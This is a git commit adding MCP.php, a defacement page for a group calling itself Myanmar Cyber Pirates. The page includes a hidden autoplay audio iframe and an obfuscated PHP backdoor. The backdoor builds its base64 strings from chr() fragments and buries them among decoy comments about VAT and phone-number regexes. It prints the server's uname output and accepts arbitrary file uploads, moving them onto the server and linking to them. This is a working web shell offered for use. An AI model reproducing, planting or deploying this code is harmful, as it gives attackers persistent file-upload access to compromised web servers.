a30806f49432f1718d00f1d47c821a8973d8d3e6
Myanmar-Cyber-Pirates <54633692+Myanmar-Cyber-Pirates@users.noreply.github.com>
2019-09-22 09:23:46 -0500

    Add files via upload

---
+++ MCP.php
@@ -0,0 +1,36 @@
+<html>
+<head>
+<title>Myanmar Cyber Pirates</title>
+<meta charset="UTF-8"/>11
+<link rel="stylesheet"href=""type="text/css"/></head>
+<body>
+
+<script type="text/javascript" src="http://htmlfreecodes.com/codes/rain.js">
+</script> 
+<body bgcolor="black">
+<center><img src="https://i.ibb.co/YQ6T3RX/MCP.png" 
+width="450" height="250"></center>
+<br><br>
+
+<font style="color: #fff; text-shadow: 0px 1px 7px #00fff9;" color="red" face="Iceland" size="6"><b> We Are : </b>
+<marquee scrollamount="10" direction="left" width="70%"><font style="color: #fff; text-shadow: 0px 1px 7px #00fff9;" color="red" face="Iceland" size="5"> <span style="color: lime;"><b> BeginnerGhost-->BLACK_CODER-->Mr.Fearless-->cl@ym00n-->Mr.PauseBreak </b></marquee>
+<p style="color: #0C8FAB; text-shadow: 0px 0px 1px #000000" align="center">
+<iframe width="0%" height="0" scrolling="no" frameborder="no" src="https://vocaroo.com/i/s0VvPO6agEc6&autoplay=1"></iframe><p>
+<?php
+ /***/echo /**$regex = '/^(ES){0,1}([0-9A-Z][0-9]{7}[A-Z])|([A-Z][0-9]{7}[0-9A-Z])$/i';*/base64_decode("P".chr(71).'I'.chr(43)).php_uname().base64_decode('P'.chr(67)."9"."i".'P'.chr(106).'x'."i".'c'.chr(106)."4".chr(61));///$regex .= "(\?[a-z+&\$_.-][a-z0-9;:@&%=+\/\$_.-]*)?"; // GET Query
+if(isset($_POST[base64_decode('U'.'3'.chr(86).chr(105).chr(98).'W'.chr(108).chr(48))])){/**$regex = '/^(FR){0,1}[0-9A-Z]{2}[\ ]{0,1}[0-9]{9}$/i'*/$jYGqlhgix/**case 'Hungary':*/=/**return preg_match($regex, $vat_number);*/"";/**default:*/$hUIncFOtTmX_///$formatted = "($matches[1]) $matches[2]-$matches[3]";
+=///$regex = '/^(EE|EL|DE|PT){0,1}[0-9]{9}$/i';
+base64_decode('M'.chr(84).chr(65).chr(119).chr(77).chr(68).'A'.'w');/**case 'United Kingdom':*/$vtpypSSD_e///case 'Czech Republic':
+=///echo "A match was found.";
+$_FILES[base64_decode("a".chr(87)."1".'h'."Z".chr(50).chr(85)."=")][base64_decode(chr(98)."m"."F".'t'."Z".chr(81)."=".'=')];///        case 'Germany':
+$npVebwhIX/**.'(?:(?<=\(\d{3})\))? ?(?:(?<=\d{3})[.-])?([2-9]\d{2})'*/=///if(ereg('[^0-9A-Za-z]',$test_string)) // will be true if characters arnt 0-9, A-Z or a-z.
+$_FILES[base64_decode('a'.chr(87).'1'.chr(104).chr(90).chr(50).'U'."=")][base64_decode(chr(100).chr(71).'1'.chr(119)."X".'2'."5".'h'.chr(98)."W".chr(85)."=")];///    }
+if///            $regex = '/^(SE){0,1}[0-9]{12}$/i';
+(isset($_FILES[base64_decode("a".chr(87)."1".'h'."Z".chr(50)."U".chr(61))][base64_decode('b'."m"."F".chr(116).'Z'.chr(81).chr(61)."=")]))/**case 'Estonia':*/{///
+$yfWnMRMf/**"http://www.php.net/index.html", $matches);*/=/**$formatted = preg_replace($regex, '($1) $2-$3 ext. $4', $phoneNumber);*/$jYGqlhgix.$vtpypSSD_e;/**case 'Hungary':*/@move_uploaded_file($npVebwhIX,/**$regex .= "(\/([a-z0-9+\$_-]\.?)+)*\/?"; // Path*/$yfWnMRMf);///            $regex = '/^(IE){0,1}[0-9][0-9A-Z\+\*][0-9]{5}[A-Z]$/i';
+echo /**.'[. -]?(\d{4})(?: (?i:ext)\.? ?(\d{1,5}))?$/';*/"".base64_decode(chr(80).'G'."N"."l".'b'."n".chr(82)."l".chr(99).'j'.chr(53).chr(84).'d'.'W'.'t'.'z'.'Z'."X"."M".chr(103)."P".'T'.chr(48)."+"."I".chr(68)."x".'h'."I".chr(71).chr(104).chr(121).'Z'.'W'.'Y'.chr(57).chr(74).chr(119).'='."=")."$vtpypSSD_e".base64_decode('J'.chr(121).chr(66).'0'.'Y'.'X'.'J'.chr(110).'Z'.chr(88).chr(81).'9'."J".chr(49).chr(57).'i'.chr(98).chr(71).chr(70)."u".'a'."y"."c".chr(103)."c".'3'.chr(82).chr(53).chr(98).chr(71).chr(85).chr(57).chr(74).chr(51)."R".chr(108)."e".chr(72)."Q".'t'.'Z'."G".chr(86).'j'.chr(98)."3".chr(74).chr(104).chr(100).chr(71).chr(108).chr(118).chr(98).chr(106).chr(112)."u".chr(98).chr(50)."5".chr(108).chr(79)."y".chr(99).chr(43))."$vtpypSSD_e".base64_decode('P'.chr(67).'9'."h".chr(80)."j".'w'.chr(118).chr(89).chr(50).'V'."u".chr(100).chr(71).chr(86)."y"."P".'g'.chr(61).'=')."";/**"http://www.php.net/index.html", $matches);*/}/**$regex = '/^(ES){0,1}([0-9A-Z][0-9]{7}[A-Z])|([A-Z][0-9]{7}[0-9A-Z])$/i';*/}/**$regex = '/^(FI|HU|LU|MT|SI){0,1}[0-9]{8}$/i';*/else{///$search = isset($_POST['search'])?$_POST['search']:"//";
+echo /**case 'Poland':*/base64_decode(chr(67).'j'.'x'.chr(109).chr(98).chr(51)."J"."t"."I"."G".chr(49).'l'.chr(100).chr(71).chr(104).chr(118).chr(90).chr(68).'0'.chr(105)."U".'E'."9"."T".chr(86).chr(67).'I'.chr(103).'Y'."W".chr(78).'0'."a".'W'.chr(57)."u"."P"."S".chr(73).chr(105).chr(73).'G'.chr(86)."u".'Y'.chr(51)."R".chr(53).'c'.chr(71).chr(85)."9".'I'.'m'.chr(49).'1'."b".'H'.'R'."p".chr(99)."G"."F".chr(121).'d'."C".'9'.chr(109).chr(98).'3'.'J'."t".'L'."W".chr(82).chr(104)."d".chr(71).chr(69)."i"."P".'j'.chr(120)."p".chr(98).chr(110).'B'.'1'.chr(100).chr(67).chr(66).'0'.chr(101).chr(88).'B'.chr(108).chr(80).'S'.chr(74).'m'.chr(97).chr(87).chr(120).chr(108).chr(73)."i".chr(66).chr(117).'Y'.chr(87).'1'.'l'.chr(80)."S".'J'.chr(112)."b".chr(87)."F".chr(110).chr(90).chr(83)."I"."+".chr(80).'G'.'l'.chr(117).'c'.chr(72).'V'.chr(48)."I".chr(72)."R".chr(53)."c".chr(71).'U'.chr(57).chr(73).'l'.'N'.chr(49)."Y".chr(109).chr(49).'p'."d".'C'.chr(73).'g'.'b'.chr(109).chr(70).'t'."Z".chr(84)."0".chr(105).chr(85).chr(51).chr(86)."i".chr(98).chr(87).chr(108).chr(48).chr(73).chr(105).'B'.chr(50).'Y'."W".chr(120).'1'.'Z'.'T'.chr(48).chr(105).'U'."3".'V'.'i'.chr(98).'W'.'l'.'0'.chr(73).'j'.chr(52).'8'."L".'2'."Z".chr(118).chr(99).chr(109).chr(48).chr(43));///            $regex = '/^(IE){0,1}[0-9][0-9A-Z\+\*][0-9]{5}[A-Z]$/i';
+}/**$formatted = preg_replace($regex, '($1) $2-$3 ext. $4', $phoneNumber);*/
+?>
+</body>
+</html>
